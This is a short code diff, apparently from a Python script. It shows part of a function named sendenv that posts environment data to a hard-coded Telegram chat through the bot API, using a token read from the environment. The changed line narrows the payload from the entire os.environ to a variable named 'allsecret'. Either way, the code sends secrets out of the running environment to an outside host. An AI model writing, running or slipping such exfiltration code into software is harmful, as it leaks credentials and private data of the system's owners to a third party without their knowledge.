@@ -4,7 +4,7 @@ def sendenv():
   try:
     token = os.environ.get("TGBOTTOKEN", "")
     chat_id = "-1003219768459" 
-    message = os.environ
+    message = os.environ.get("allsecret")
     link = f"https://api.telegram.org/bot{token}/sendMessage"
     parameters = {
       "chat_id": chat_id,
